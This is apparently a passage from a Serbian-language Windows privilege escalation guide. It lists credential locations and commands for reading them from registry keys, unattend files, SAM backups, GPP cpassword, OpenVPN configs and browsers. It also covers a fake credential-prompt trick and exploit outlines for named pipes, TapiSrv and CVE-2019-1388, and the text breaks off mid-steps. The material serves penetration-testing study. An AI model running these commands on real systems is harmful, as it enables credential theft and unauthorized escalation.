Solar-PuTTY je zaseban upravljač sesija. Njegovo izvorno šifrovano skladište može biti na putanji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok se izvezena rezervna kopija sesija može zvati `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi zaštićeni lozinkom i mogu sadržati sesije, ključeve, skripte, oznake i veze; njihov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi putanju do izvornog skladišta. Najpre proverite dozvole i putanje datoteka. Pronalaženje bilo koje od tih datoteka ne otkriva lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH ključevi hostova

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos u toj putanji, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovan, ali se lako može dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako `ssh-agent` servis nije pokrenut, a želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim nekoliko ssh ključeva, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko ssh-a. Registry HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije otkrio upotrebu `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Fajlovi za unattended instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete da potražite i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM i SYSTEM резервне копије

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) datoteke rezervnih kopija mogu sadržati i offline košnice `SAM`, `SECURITY` i `SYSTEM`. Dajte prednost lokalno dostupnim direktorijumima sa rezervnim kopijama ili image datotekama i proverite **nazive stavki** u image-u pre nego što bilo šta izdvojite; samo ime `.wim` datoteke ne dokazuje da su košnice izložene, a uobičajene `install.wim`, `boot.wim` i recovery image datoteke često su lažni tragovi. SMB deljeni resurs predstavlja zaseban put za pristup i treba ga proveravati samo ako je taj resurs obuhvaćen opsegom. Pogledajte Microsoft-ove smernice za [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za datoteke košnica registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Pristupni podaci za Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala primenu prilagođenih lokalnih administratorskih naloga na grupi računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne propuste. Prvo, svaki korisnik domena mogao je da pristupi Group Policy Objects (GPOs), sačuvanim kao XML datoteke u SYSVOL-u. Drugo, svaki autentifikovani korisnik mogao je da dešifruje lozinke u tim GPP-ovima, šifrovane algoritmom AES256 pomoću javno dokumentovanog podrazumevanog ključa. Ovo je predstavljalo ozbiljan rizik jer je korisnicima moglo omogućiti da steknu povišene privilegije.

Da bi se ovaj rizik ublažio, razvijena je funkcija koja pretražuje lokalno keširane GPP datoteke i traži polje „cpassword“ koje nije prazno. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u prepoznavanju i otklanjanju ove bezbednosne ranjivosti.

Potražite sledeće datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da biste dešifrovali cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa pristupnim podacima:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP backup arhiva postavljena direktno u webroot koji se servira može da otkrije prethodne konfiguracione fajlove i ponovo upotrebljive akreditive. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je jedna od mogućih. Brza lokalna inventura može da izlista nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da pronađeni kredencijal omogućava veće privilegije.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logovi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže pristupne podatke**

Poznate datoteke koje su ranije sadržale **lozinke** u **čistom tekstu** ili Base64 formatu

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Varijanta liste naziva datoteka bez ekstenzije Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Podudarno ime datoteke tretirajte kao mogući trag ka šifrovanom trezoru; njegovo prisustvo ne znači da možete da ga pročitate, otključate ili upotrebite sačuvane akreditive. Prilikom provere gde se takve datoteke čuvaju, pregledajte dostupne korisničke profile i konfigurisane korene za deljenje datoteka.

Čitljiv KeePass `.kdbx` je takođe samo trag ka šifrovanom trezoru. Da biste ga otključali, potrebni su stvarna glavna lozinka i sve konfigurisane datoteke ključeva ili faktori naloga. Ako ovlašćena provera pronađe par LM:NT hash vrednosti u unosu, proverite navedeni nalog i utvrdite da li je NT hash aktuelan i da li ga prihvata NTLM servis ciljnog sistema pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje Administrator ili SYSTEM prava; moraju biti ispunjeni i uslovi za udaljeni pristup servisu, prava naloga i svaki zaseban korak za izvršavanje servisa. Inventar treba da navede putanju do trezora i da li je čitljiv, a ne da ispisuje bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Varijanta komande za pretragu bez dodatka Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Kredencijali u korpi za otpatke

Trebalo bi da proverite i korpu za otpatke i potražite kredencijale.

Proverite dostupne unose u korpi za otpatke da biste pronašli obrisane rezervne kopije i arhive konfiguracije, kao i datoteke čiji nazivi izričito pominju kredencijale. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara nekoliko meseci i imati uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u zapisu `$I`, a obrisanu datoteku kao upareni unos `$R`; pre otvaranja arhive pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje. Vidljivost zavisi od volumena, korisničkog SID-a i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji rezervna kopija koju je moguće oporaviti. Naziv arhive treba smatrati kandidatom za pregled, a ne dokazom da sadrži važeću tajnu.

Dostupan obrisani `.pfx` može biti i trag koji vodi do **potpisivanja koda**. Ako sadrži dostupan privatni ključ, njime se može potpisati izmenjena PowerShell skripta; [PowerShell zahteva sertifikat za potpisivanje koda sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u procenjuju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje pod drugim nalogom zahteva da trenutni identitet može da izmeni konkretnu skriptu, da važeće pravilo prihvata rezultujući potpis za skriptu i ciljni nalog, kao i da zakazani zadatak ili drugi proces sa višim privilegijama zaista pokreće skriptu. Sam naziv datoteke `.pfx`, predmet sertifikata ili mogućnost upisivanja u skriptu ne dokazuju da je taj lanac uspostavljen. Pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka pregledajte metapodatke, ACL-ove, smernice i zakazanu komandu.

Pregledajte i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke da biste pronašli tragove do kredencijala. Izvezena BitLocker datoteka za oporavak može biti sačuvana kao HTML ili TXT, ponekad unutar arhive sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu sa starijim rezervnim kopijama; pregledajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za oporavak domenskih kredencijala van mreže potreban je i odgovarajući hive `SYSTEM`, kao što je opisano u [postupku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sami nazivi datoteka i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Da biste **oporavili lozinke** sačuvane u nekoliko programa, možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra sa kredencijalima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje OpenSSH ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a ili Firefox-a**.\
Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a, Edge-a ili Firefox-a**.\
Takođe proverite istoriju, obeleživače i omiljene stranice pregledača, jer su možda tamo sačuvane neke **lozinke**.

Za uobičajeni profil Edge **Default** trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da promene tu lokaciju. Samo postojanje datoteka ukazuje na mogući izvor sačuvanih kredencijala: proverite da li su datoteke čitljive, da li imate odgovarajući DPAPI kontekst korisnika ili drugi odobreni materijal ključa i da li sačuvana prijava pripada nalogu sa višim privilegijama. Samo izlistavanje putanja ne mora da otvara bazu podataka niti da prikazuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu uparene datoteke ključa i šifrovanih prijava. Njihovo postojanje samo ukazuje na mogući izvor: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li je ključ zaštićen primarnom lozinkom pre nego što zaključite da su kredencijali upotrebljivi. Ako pronađeni kredencijal pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i [prava grupe za čitanje ili dešifrovanje LAPS lozinke](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne ukazuju na put do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta je **identifikovana putem ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost putem jednog ili više interfejsa, identifikovanih ID-ovima interfejsa (IID).

COM klase i interfejsi definisani su u registru, pod **HKEY\CLASSES\ROOT\CLSID** odnosno **HKEY\CLASSES\ROOT\Interface**. Ovaj registar nastaje spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podregistar **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL**, kao i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podregistar InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL, kao i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koji DLL** koji će biti izvršen, mogli biste da **eskalirate privilegije** ako taj DLL izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretraga datoteke sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji pretražuju lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** dodatak koji sam napravio da bi **automatski izvršavao svaki Metasploit POST modul koji pretražuje akreditive** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan sjajan alat za izdvajanje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) pretražuje **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasledi sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle do privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i **ovaj drugi tekst za potpunije objašnjenje kako testirati i zloupotrebiti veći broj otvorenih handle-ova procesa i thread-ova nasleđenih sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, koji se nazivaju **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na klijent/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može **preuzeti identitet** **klijenta**, pod uslovom da ima potrebna **SeImpersonate** prava. Pronalaženje **privilegovanog procesa** koji komunicira preko pipe-a koji možete da oponašate pruža priliku da **steknete veće privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje ovakvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Sledeći alat omogućava i **presretanje komunikacije named pipe-a pomoću alata poput Burp-a:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava da izlistate i pregledate sve pipe-ove kako biste pronašli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može zloupotrebiti asinhroni put događaja zasnovan na mailslot-u kako bi pretvorio `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koji postojeći fajl u koji može da upisuje `NETWORK SERVICE`, a zatim stekao administratorska prava za Telephony i učitao proizvoljan DLL kao servis. Kompletan tok:

- `ClientAttach` sa vrednošću `pszDomainUser` postavljenom na postojeću putanju u koju je moguće upisivati → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhrone upise događaja.
- Svaki događaj upisuje napadačem kontrolisani `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite podatke pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odregistrujte/ugasite da biste ponavljali determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa putanjom do proizvoljnog DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Ostalo

### Ekstenzije fajlova koje mogu da izvrše sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da aktiviraju opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše fajlove koje kontroliše napadač kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Praćenje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju kredencijale u komandnoj liniji**. Skripta u nastavku beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP-a) i UAC je omogućen, u nekim verzijama sistema Microsoft Windows moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz naloga korisnika bez privilegija.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, ne morate ništa da instalirate, a binarni fajl koji se koristi tokom ovog procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se iskoristila ova ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

